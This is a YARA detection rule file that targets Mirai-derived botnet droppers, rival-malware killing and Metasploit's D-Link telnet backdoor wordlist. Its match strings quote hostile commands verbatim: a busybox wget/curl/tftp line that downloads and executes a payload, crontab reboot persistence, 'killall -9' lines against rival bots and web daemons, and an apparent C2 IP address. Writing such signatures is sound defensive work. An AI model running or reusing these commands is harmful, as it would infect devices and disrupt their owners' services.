rule Metasploit_Telnet_Backdoor_Wordlist{
    meta:
    description="Detects metasploit's telnet backdoor wordlist usage"
    author="MedicWiesel"
    date="11-10-2026"
    reference="https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink_telnet_backdoor_userpass.txt"
    strings:
    $telnetbackdoorwordlist1="wapnd03cm_dkbs_dap2555"
    $telnetbackdoorwordlist2="wapnd04cm_dkbs_dap3525"
    $telnetbackdoorwordlist3="wapnd15_dlob_dap1522b"
    $telnetbackdoorwordlist4="wrgac01_dlob.hans_dir865"
    $telnetbackdoorwordlist5="wrgg15_di524"
    $telnetbackdoorwordlist6="wrgg19_c_dlwbr_dir300"
    $telnetbackdoorwordlist7="wrgn22_dlwbr_dir615"
    $telnetbackdoorwordlist8="wrgn23_dlwbr_dir300b"
    $telnetbackdoorwordlist9="wrgn28_dlob_dir412"
    $telnetbackdoorwordlist10="wrgn39_dlob.hans_dir645"
    $telnetbackdoorwordlist11="wrgn39_dlob.hans_dir645_V1"
    $telnetbackdoorwordlist12="wrgn49_dlob_dir600b"
    $telnetbackdoorwordlist13="wrgnd08_dlob_dir815"
    condition:
    uint32be(0)==0x7F454C46 and
    filesize < 1MB and
    10 of them
}
rule Rival_killing{
    meta:
        description="detects killing rival malware and connections"
        author="MedicWiesel"
        date="11-10-2026"
    strings:
        $killall="killall -9"


        $rival1=".nttpd"
        $rival2=".sh4"
        $rival3="dvrHelper"
        $rival4="yakuza"
        $rival5="mozi"
        $rival6="satori"
        $rival7=".tsunami"
        $rival8=".hakai"
        $rival9=".owari"
        $rival10="mirai"
        $rival11="hajime"
        $rival12=".nippon"
        $rival13="macHelper"
        $rival14=".loaded"
        $rival15="zollard"
        $rival16=".chinaz"

        $c2serv1="httpd"
        $c2serv2="lighttpd"
        $c2serv3="boa"
        $c2serv4="goahead"
        $c2serv5="mini_httpd"
        $c2serv6="webs"
    condition:
        uint32be(0)==0x7F454C46 and
        filesize < 1MB and
        $killall and
        7 of ($rival*) and
        3 of ($c2serv*)
}
rule Mirai_Dropper_variant{
    meta:
        description="Detects mirai derived botnet malware/dropper"
        author="MedicWiesel"
        date="11-10-2026"
        reference="https://bazaar.abuse.ch/sample/f8295be7f423041d8e271707975deb2972e8222b1eb8f5c2f81136f063417d97/"
    strings:
        $ka1="killall -9 .t .nttpd .sh4 dvrHelper yakuza .mi mozi satori .tsunami .hakai .owari mirai hajime .nippon macHelper .z .loaded zollard .chinaz .sh 2>/dev/null"
        $ka2="killall -9 httpd lighttpd boa goahead mini_httpd webs 2>/dev/null"

        $proclookup="/proc/self/exe"

        $persistence1="(crontab -l 2>/dev/null; printf '@reboot %s %s &\\n') | crontab - 2>/dev/null"
        $persistence2="/var/cache/.khelper"
        $persistence3="/usr/lib/.libsyslog.so"
        $persistence4="/var/lib/.ntphelper"
        $persistence5="/data/.khelper"
        $persistence6="/etc/rc.local"

        $ip="130.12.180.212"

        $bb1="rm -f .f; /bin/busybox wget -O .f http://%s/%s || wget -O .f http://%s/%s || curl -o .f http://%s/%s || /bin/busybox tftp -g -l .f -r %s %s; %s"
        $bb2="/bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -f .f"
        $bb3="/bin/busybox chmod 777 .d || chmod 777 .d; ./.d > .f; /bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -rf .d .f"
        $bb4="/bin/busybox cat /proc/self/exe || cat /proc/self/exe"
        $bb5="/bin/busybox cat /proc/cpuinfo || cat /proc/cpuinfo"

        $sh1="cd /tmp || cd /var/tmp || cd /var || cd /dev/shm || cd /var/run || cd /data; rm -f .d .s .f; %s"
        $sh2="echo -n${MONITOR}e '"

        $antidebug="antidebug_init"

        $speedtest1="speedtest_parse_server"
        $speedtest2="speedtest_pid"
        $speedtest3="speedtest_retrieve_list"
        $speedtest4="speedtest_free_list"
        $speedtest5="speedtest_lowest_latency"
        $speedtest6="speedtest_upload_test"

        $stun1="stun_parse_xor_mapped_address"
        $stun2="stun_random_server"
        $stun3="stun_parse_response"
        $stun4="stun_get_public_ip"

        $locker1="locker_cache_clear"
        $locker2="locker_cache_exists"
        $locker3="locker_cache_insert"
        $locker4="locker_check_proc"
        $locker5="locker_kill"
        $locker6="locker_init"

        $downloader1="downloader_init"
        $downloader2="downloader_add"
        $downloader3="downloader_retrieve"

        $network1="flood_retrieve_iplist"
        $network2="target_random_port"

        $killer1="killer_kill_by_inode"
        $killer2="killer_retrieve_cmdline"

    condition:
        uint32be(0)==0x7F454C46 and
        filesize < 1MB and
        (
            all of ($ka*) or
            Rival_killing
        ) and
        4 of ($persistence*,$proclookup) and
        (
            12 of ($speedtest*, $downloader*, $network*, $killer*, $stun*, $locker*)  or
            3 of ($bb*,$sh*) or
            $antidebug or
            ($ip and Metasploit_Telnet_Backdoor_Wordlist)
        )
}

